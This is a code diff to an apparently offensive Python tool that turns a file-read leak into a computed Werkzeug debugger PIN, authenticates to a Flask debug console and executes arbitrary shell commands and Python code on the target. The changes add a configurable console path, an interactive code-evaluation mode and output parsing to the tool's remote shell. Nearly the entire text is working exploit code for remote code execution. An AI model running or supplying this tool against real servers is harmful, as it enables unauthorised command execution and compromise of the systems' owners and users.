@@ -1,13 +1,15 @@
+import html.entities
 import requests
-from urllib.parse import urlsplit
+from urllib.parse import urlsplit, quote_plus
 import re
 import hashlib
 from itertools import chain
 from bs4 import BeautifulSoup as bs
 import json
-
+import html
 from prompt_toolkit import PromptSession
 from prompt_toolkit.shortcuts import clear
+from rich import print as rprint
 
 def error(message="", prefix=""):
     print(f"{prefix}[ERROR] {message}")
@@ -21,12 +23,21 @@ class WConsoleExtractor:
     modname = "flask.app"
     class_name = "Flask"
 
-    def __init__(self, target:str, leak_function) -> None:
+    def __init__(self, target:str, leak_function, debugger_path:str="/console", no_colors=False):
+        """
+        Init WConsoleExtractor object
+        target: the target url
+        leak_function: a function that takes a filepath as parameter and returns its content
+        debugger_path: the werkzeug console path, default is /console
+        no_colors: disable colored output on debugger feature
+        """
         self.target = target
+        self.no_colors = no_colors
         if not callable(leak_function):
             error("Your leak function is not callable")
 
         self.leak_function = leak_function
+        self.debugger_path = debugger_path
 
         # Get base url
         splitted = urlsplit(self.target)
@@ -147,8 +158,8 @@ class WConsoleExtractor:
         return 0
 
     @staticmethod
-    def sanitize_output(output:str):
-        return output.replace("\\n", "\n")[2:-1]
+    def sanitize_command_output(output:str):
+        return output.replace("\\n", "\n")[2:-1].strip()
             
 
     def get(self, path:str):
@@ -165,7 +176,7 @@ class WConsoleExtractor:
             return 0
         
     def check_debug_mode(self):
-        r = self.get("/console")
+        r = self.get(self.debugger_path)
         return r.status_code == 200, r.text
     
     def check_werkzeug(self):
@@ -174,6 +185,12 @@ class WConsoleExtractor:
     
     def print(self, message=""):
         print(message, end="")
+
+    def rprint(self, message=""):
+        if self.no_colors:
+            self.print(message)
+        else:
+            rprint(message)
     
     # Leaks
     def choose_username(self, etc_passwd:str):
@@ -343,7 +360,7 @@ class WConsoleExtractor:
         return token[0]
     
     def authent(self):
-        authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
+        authent_path = f"/?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
         r = self.get(authent_path)
 
         try:
@@ -351,39 +368,59 @@ class WConsoleExtractor:
         except:
             error("Error during authentication")
         return state["auth"]
+    
+    def parse_html(self, content:str):
+        try:
+            soup = bs(content, "html.parser")
+            traceback = soup.find("div", attrs={"class":"traceback"})
+
+            if traceback:
+                if "noframe-traceback" in traceback.attrs["class"]:
+                    err = traceback.find("pre")
+                else:
+                    err = traceback.find("blockquote")
+            
+                if not err:
+                    error("Unhandled error, please report the issue on tool's repository")
+            else:
+                res = content.split("\n")[1]
+                output = html.unescape(re.sub(r"<((?![<>]).)+>", "", res))
+        except Exception as e:
+            error(e)
+            pass
+        
+        return output.strip()
+    
+    def exec_console(self, code:str):
+        self.authent()
+        return self.get(f"{self.debugger_path}?__debugger__=yes&cmd={quote_plus(code)}&frm=0&s={self.token}")
 
     def exec_cmd(self, cmd:str):
         argv = cmd.split(' ')
-
-        self.authent()
-        
-        payload = f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()"
-        url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
-        res = self.get(url)
+        res = self.exec_console(
+            f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()[0]"
+        )
 
         if res.status_code == 404:
             error("Error while sending command, please report the issue on tool's repository")
             return
+    
+        output = self.parse_html(res.text)
+
+        return WConsoleExtractor.sanitize_command_output(output)
+    
+    def exec_dbg(self, code:str):
+        res = self.exec_console(code)
+
+        if res.status_code == 404:
+            error("Error while evaluating code, please report the issue on tool's repository")
+            return
         
-        soup = bs(res.text, 'html.parser')
-        span = soup.find("span", attrs={"class":"string"})
-        traceback = soup.find("div", attrs={"class":"traceback"})
-
-        if span:
-            res = span.contents[0]
-            extended = span.find("span")
-            if extended:
-                res += extended.contents[0]
-            output = WConsoleExtractor.sanitize_output(res)
-        elif traceback:
-            err = traceback.find("blockquote")
-            output = err.contents[0]
-        else:
-            output = ""
-
-        return output.strip()
-
+        output = self.parse_html(res.text)
+        return output
+    
     def shell(self):
+        switch_commands = ["shell", "debug"]
         exit_commands = ["exit", "quit", "q"]
         clear_commands = ["clear", "c"]
         session = PromptSession()
@@ -396,11 +433,39 @@ class WConsoleExtractor:
                 if cmd in clear_commands:
                     clear()
                     continue
+                if cmd.strip() in switch_commands:
+                    self.debugger()
             except (KeyboardInterrupt, EOFError, SystemExit):
                 break
             else:
                 output = self.exec_cmd(cmd)
                 if output.startswith("FileNotFoundError"):
-                    output = f"{cmd}: command not found"
+                    output = f"{cmd}: Command Not Found"
                 self.print(f"{output}\n")
-        info("Shell terminated")
+        info("Shell Terminated")
+
+    def debugger(self):
+        switch_commands = ["shell", "debug"]
+        exit_commands = ["exit", "quit", "q"]
+        clear_commands = ["clear", "c"]
+        session = PromptSession()
+
+        while True:
+            try:
+                code = session.prompt("[DEBUGGER] > ")
+                if code in exit_commands:
+                    raise SystemExit
+                if code.strip() in clear_commands:
+                    clear()
+                    continue
+                if code.strip() in switch_commands:
+                    self.shell()
+            except (KeyboardInterrupt, EOFError, SystemExit):
+                break
+            else:
+                try:
+                    output = self.exec_dbg(code)
+                except Exception as e:
+                    output = str(e)
+                self.rprint(f"{output}")
+        info("Debugger Terminated")
